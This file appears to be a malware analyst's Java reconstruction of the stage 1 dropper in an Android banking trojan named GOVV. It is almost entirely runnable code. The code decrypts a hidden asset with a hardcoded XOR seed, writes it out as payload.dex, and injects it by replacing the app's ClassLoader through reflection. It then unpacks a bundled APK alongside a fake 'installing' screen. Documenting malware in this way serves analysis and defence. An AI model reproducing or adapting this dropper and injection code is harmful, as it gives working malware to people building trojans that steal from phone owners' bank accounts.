/**
 * GOVV Banking Trojan — Stage 1 Dropper Application Class
 * Reconstructed from DEX bytecode (androguard disassembly)
 *
 * Original obfuscated class:
 *   Lcom/tyshpgid/akqczvkxm/vbz/rbi/oI4lIJOlbjSkXqgwGehsi9Q9r;
 *
 * This is NOT the original source code.
 * It is a human-readable reconstruction of the bytecode behavior.
 */
public class DroperApplication extends Application {

    /**
     * Runs BEFORE anything else in the app — before onCreate(), before UI.
     * This is the primary dropper entry point.
     *
     * Decrypts and loads payload.dex into the running process.
     */
    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);

        File dexOutputDir = base.getDir("p_dex", 0);
        File payloadDexFile = new File(dexOutputDir, "payload.dex");

        // Delete any existing payload.dex
        if (payloadDexFile.exists()) {
            payloadDexFile.setWritable(true);
            payloadDexFile.delete();
        }

        // Open encrypted asset "NhxxcPuLOx"
        try (
            InputStream assetIn = base.getAssets().open("NhxxcPuLOx");
            DataInputStream dis = new DataInputStream(assetIn)
        ) {
            // Skip 24-byte header
            dis.skipBytes(24);

            // Read encrypted data length (big-endian int)
            int encLen = dis.readInt();
            byte[] encData = new byte[encLen];
            dis.readFully(encData);

            // Decrypt: XOR with Java Random stream (seed = 3017671131121758624L)
            Random rng = new Random(3017671131121758624L);
            for (int i = 0; i < encLen; i++) {
                encData[i] ^= (byte)(rng.nextInt(256));
            }

            // Decompress GZIP → payload.dex
            try (
                GZIPInputStream gzIn = new GZIPInputStream(new ByteArrayInputStream(encData));
                FileOutputStream fos = new FileOutputStream(payloadDexFile)
            ) {
                byte[] buf = new byte[8192];
                int read;
                while ((read = gzIn.read(buf)) != -1) {
                    fos.write(buf, 0, read);
                }
                fos.flush();
                fos.getFD().sync();
            }

            // Android 14+ (API 34+): make read-only for security
            if (Build.VERSION.SDK_INT >= 34) {
                payloadDexFile.setReadOnly();
            }

            // Inject payload.dex into running process
            injectDexClassLoader(base, payloadDexFile, dexOutputDir);

        } catch (Exception e) {
            Log.e("STUB", "A_F");
        }
    }

    /**
     * Replaces the application's ClassLoader with a DexClassLoader
     * that loads payload.dex, effectively injecting Stage 2 code
     * into the running process without restarting.
     *
     * Uses reflection to access internal Android runtime fields.
     */
    private void injectDexClassLoader(Context ctx, File dexFile, File optDir) {
        try {
            // Create DexClassLoader for payload.dex
            DexClassLoader dexLoader = new DexClassLoader(
                dexFile.getAbsolutePath(),
                optDir.getAbsolutePath(),
                ctx.getApplicationInfo().nativeLibraryDir,
                ctx.getClassLoader()
            );

            // Get ActivityThread via reflection
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Method getCurrentThread = activityThreadClass.getMethod("currentActivityThread");
            Object activityThread = getCurrentThread.invoke(null);

            // Access mPackages (WeakReference map of loaded packages)
            Field mPackagesField = activityThread.getClass().getDeclaredField("mPackages");
            mPackagesField.setAccessible(true);
            Map<?, ?> mPackages = (Map<?, ?>) mPackagesField.get(activityThread);

            // Get LoadedApk for our package
            Object loadedApkRef = mPackages.get(ctx.getPackageName());
            Object loadedApk = ((WeakReference<?>) loadedApkRef).get();

            // Replace mClassLoader with our DexClassLoader
            Field mClassLoaderField = loadedApk.getClass().getDeclaredField("mClassLoader");
            mClassLoaderField.setAccessible(true);
            mClassLoaderField.set(loadedApk, dexLoader);   // ← INJECTION POINT

            // Also replace thread context ClassLoader
            Thread.currentThread().setContextClassLoader(dexLoader);

        } catch (Exception e) {
            Log.e("STUB", "AS_F");
        }
    }

    /**
     * After Stage 2 is injected, extract the b.apk bundle.
     * This runs the "installing" fake UI and drops the banking trojan.
     */
    @Override
    public void onCreate() {
        super.onCreate();

        // Extract b.apk bundle from asset "lAsFuQPphUK"
        extractAssetBundle("lAsFuQPphUK");
    }

    /**
     * Decrypts and extracts the bundled files from an encrypted asset.
     *
     * Bundle format after decryption:
     *   [int: file_count]
     *   [int: name_len][name_bytes][int: data_len][data_bytes] × file_count
     *
     * Contents: b.apk, installing.html, Google_Play.png, dexopt/*
     */
    private void extractAssetBundle(String assetName) {
        File outputDir = new File(getFilesDir(), "assets_i");
        if (outputDir.exists()) return;  // Already extracted
        outputDir.mkdirs();

        try (
            DataInputStream dis = new DataInputStream(
                new DataInputStream(getAssets().open(assetName))
            )
        ) {
            // Skip 24-byte header, read length, decrypt, decompress
            dis.skipBytes(24);
            int encLen = dis.readInt();
            byte[] enc = new byte[encLen];
            dis.readFully(enc);

            // Same XOR key as payload.dex
            Random rng = new Random(3017671131121758624L);
            for (int i = 0; i < encLen; i++) {
                enc[i] ^= (byte)(rng.nextInt(256));
            }

            DataInputStream bundle = new DataInputStream(
                new GZIPInputStream(new ByteArrayInputStream(enc))
            );

            // Extract each file from bundle
            int fileCount = bundle.readInt();
            for (int i = 0; i < fileCount; i++) {
                int nameLen = bundle.readInt();
                byte[] nameBytes = new byte[nameLen];
                bundle.readFully(nameBytes);
                String name = new String(nameBytes, "UTF-8");

                int dataLen = bundle.readInt();
                File outFile = new File(outputDir, name);
                outFile.getParentFile().mkdirs();
                try (FileOutputStream fos = new FileOutputStream(outFile)) {
                    // Write in 8KB chunks
                    byte[] buf = new byte[8192];
                    int remaining = dataLen;
                    while (remaining > 0) {
                        int toRead = Math.min(buf.length, remaining);
                        bundle.readFully(buf, 0, toRead);
                        fos.write(buf, 0, toRead);
                        remaining -= toRead;
                    }
                }
            }

        } catch (Exception e) {
            Log.e("STUB", "AS_F");
        }
    }
}
